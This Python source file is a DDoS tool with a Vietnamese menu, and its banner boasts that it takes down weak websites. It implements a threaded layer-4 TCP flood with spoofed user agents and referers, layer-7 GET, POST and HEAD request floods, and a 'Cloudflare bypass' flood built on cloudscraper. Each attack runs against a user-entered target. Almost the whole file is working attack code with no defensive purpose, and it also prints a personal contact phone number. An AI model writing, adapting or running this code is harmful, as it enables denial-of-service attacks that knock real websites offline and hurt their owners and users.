from os import system, name
import os, threading, requests, sys, cloudscraper, datetime, time, socket, socks, ssl, random, httpx
from urllib.parse import urlparse
from requests.cookies import RequestsCookieJar
import undetected_chromedriver as webdriver
from sys import stdout
from colorama import Fore, init
os.system("clear")
stdout.write(Fore.CYAN+"Tool được phát triển bởi Khang Phan\n")
stdout.write(Fore.RED+":))) TOOL NÀY DDOS WEB YẾU THÔI NHA MẤY ÔNG CHÁU\n")

def tcp():
	useragents=["Mozilla/5.0 (Android; Linux armv7l; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 Fennec/10.0.1","Mozilla/5.0 (Android; Linux armv7l; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Fennec/2.0.1","Mozilla/5.0 (WindowsCE 6.0; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	"Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0",
	"Mozilla/5.0 (Windows NT 5.2; rv:10.0.1) Gecko/20100101 Firefox/10.0.1 SeaMonkey/2.7.1",
	"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/15.0.874.120 Safari/535.2",
	"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/535.2 (KHTML, like Gecko) Chrome/18.6.872.0 Safari/535.2 UNTRUSTED/1.0 3gpp-gba UNTRUSTED/1.0",
	"Mozilla/5.0 (Windows NT 6.1; rv:12.0) Gecko/20120403211507 Firefox/12.0",
	"Mozilla/5.0 (Windows NT 6.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	"Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:2.0.1) Gecko/20100101 Firefox/4.0.1",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.27 (KHTML, like Gecko) Chrome/12.0.712.0 Safari/534.27",
	"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.24 Safari/535.1",
	"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
	"Mozilla/5.0 (Windows; U; ; en-NZ) AppleWebKit/527  (KHTML, like Gecko, Safari/419.3) Arora/0.8.0",
	"Mozilla/5.0 (Windows; U; Win98; en-US; rv:1.4) Gecko Netscape/7.1 (ax)",
	"Mozilla/5.0 (Windows; U; Windows CE 5.1; rv:1.8.1a3) Gecko/20060610 Minimo/0.016"]
	ref=['http://www.bing.com/search?q=',
	'https://www.yandex.com/yandsearch?text=',
	'https://duckduckgo.com/?q=']
	acceptall=["Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept-Encoding: gzip, deflate\r\n",
	"Accept-Language: en-US,en;q=0.5\r\nAccept-Encoding: gzip, deflate\r\n",
	"Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5\r\nAccept-Charset: iso-8859-1\r\n",
	"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\nAccept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\n",
	"Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*\r\nAccept-Language: en-US,en;q=0.5\r\n",
	"Accept: text/html, application/xhtml+xml, image/jxr, */*\r\nAccept-Encoding: gzip\r\nAccept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n"
	"Accept-Charset: utf-8, iso-8859-1;q=0.5\r\nAccept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1\r\n",
	"Accept-Language: en-US,en;q=0.5\r\n"]
	
	ip = str(input('[+] Target: '))
	port = int(input('[+] Port: '))
	pack = int(input('[+] Packet/s: '))
	thread = int(input('[+] Threads: '))
	def start():
	    global useragents, ref, acceptall
	    hh = random._urandom(3016)
	    xx = int(0)
	    useragen = "User-Agent: "+random.choice(useragents)+"\r\n"
	    accept = random.choice(acceptall)
	    reffer = "Referer: "+random.choice(ref)+str(ip) + "\r\n"
	    content    = "Content-Type: application/x-www-form-urlencoded\r\n"
	    length     = "Content-Length: 0 \r\nConnection: Keep-Alive\r\n"
	    target_host = "GET / HTTP/1.1\r\nHost: {0}:{1}\r\n".format(str(ip), int(port))
	    main_req  = target_host + useragen + accept + reffer + content + length + "\r\n"
	    while True:
	        try:
	            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	            s.connect((str(ip),int(port)))
	            s.send(str.encode(main_req))
	            for i in range(pack):
	                s.send(str.encode(main_req))
	            xx += random.randint(0, int(pack))
	            print("[+] Attacking {0}:{1} | Sent: {2}".format(str(ip), int(port), xx))
	        except:
	            s.close()
	            
	
	for x in range(thread):
	    thred = threading.Thread(target=start)
	    thred.start()

def l7():
    stdout.write(Fore.RED+" [\x1b[38;2;0;255;189mLAYER 7"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+"[1] • "+Fore.WHITE+"CFB        "+Fore.RED+": "+Fore.WHITE+"Bypass CF attack\n")
    stdout.write(Fore.MAGENTA+"[2] • "+Fore.WHITE+"GET        "+Fore.RED+": "+Fore.WHITE+"Head Request attack\n")
    stdout.write(Fore.MAGENTA+"[3] • "+Fore.WHITE+"POST       "+Fore.RED+": "+Fore.WHITE+"Post Request attack\n")
    stdout.write(Fore.MAGENTA+"[4] • "+Fore.WHITE+"HEAD       "+Fore.RED+": "+Fore.WHITE+"Head Request attack\n")
    cm=input('Chọn Method:')
    if cm=='2':
        url=input('URL:')
        th=int(input('Thread:'))
        get()
    elif cm=='1':
        url=input('URL:')
        th=int(input('Thread:'))
        LaunchCFB(url, th)
    elif cm=='4':
        url=input('URL:')
        th=int(input('Thread:'))
        head()
    elif cm=='3':
        url=input('URL:')
        th=int(input('Thread:'))
        post()
def l4():
    stdout.write(Fore.RED+" [\x1b[38;2;0;255;189mLAYER 4"+Fore.RED+"]\n")
    stdout.write(Fore.MAGENTA+"[1] • "+Fore.WHITE+"TCP        "+Fore.RED+": "+Fore.WHITE+"\n")
    
    cm=input('Chọn Method:')
    if cm=='1':
        tcp()
    


def get():
    start = time.perf_counter()
    client = requests.Session()

 
    	
    def request(secret_number):
        print('Method:Get | Status code:', client.get(url.format(secret_number), timeout=1000).status_code,'| Luồng:', threading.active_count())
    
    tasks = []
    
    for secret in range(th):
        # Tạo thread và khởi động chúng
        task = threading.Thread(target=request, args=(secret,))       
        task.start()
        tasks.append(task)
def post():
    start = time.perf_counter()
    client = requests.Session()

 
    	
    def request(secret_number):
        print('Method:Post | Status code:', client.post(url.format(secret_number), timeout=1000).status_code,'| Luồng:', threading.active_count())
    
    tasks = []
    
    for secret in range(th):
        
        task = threading.Thread(target=request, args=(secret,))       
        task.start()
        tasks.append(task)
def head():
    start = time.perf_counter()
    client = requests.Session()

 
    	
    def request(secret_number):
        print('Method:Head | Status code:', client.head(url.format(secret_number), timeout=1000).status_code,'| Luồng:', threading.active_count())
    
    tasks = []
    
    for secret in range(th):
        
        task = threading.Thread(target=request, args=(secret,))       
        task.start()
        tasks.append(task)
        
       
        
    
  
    
def LaunchCFB(url, th):
    scraper = cloudscraper.create_scraper()
    for _ in range(int(th)):
        thd = threading.Thread(target=AttackCFB, args=(url, scraper))
        thd.start()


def AttackCFB(url, scraper):
    print('Method:CloudFlare Bypass | Status code:', scraper.get(url, timeout=1000).status_code,'| Luồng:', threading.active_count())
stdout.write(Fore.MAGENTA+"[1] • "+Fore.WHITE+"Liên hệ\n")
stdout.write(Fore.CYAN+"[2] • "+Fore.WHITE+"Chọn Layer\n")
stdout.write(Fore.RED+"->")
in4orlayer=input()
os.system("clear")
if in4orlayer=='1':
    stdout.write(Fore.MAGENTA+"-> "+Fore.YELLOW+"Zalo    "+Fore.RED+": 0947313943\n")
    stdout.write(Fore.WHITE+"•"+ "Nhấn 2 để chọn Layer.\n")
    stdout.write(Fore.RED+"->")
    ex=input()
    if ex=='2':
        os.system("clear")
        stdout.write(Fore.MAGENTA+"[1] • Layer7\n") 
        stdout.write(Fore.CYAN+"[2] • Layer4\n") 
        stdout.write(Fore.RED+"->")
        ly2=input()
    if ly2=='2':
        l4()
    elif ly2=='1':
        l7()
		
	
elif in4orlayer=='2':
	stdout.write(Fore.MAGENTA+"[1] • Layer7\n")
	stdout.write(Fore.CYAN+"[2] • Layer4\n")
	stdout.write(Fore.RED+"->")
	ly=input()
	if ly=='2':
	    l4()
	elif ly=='1':
	    l7()
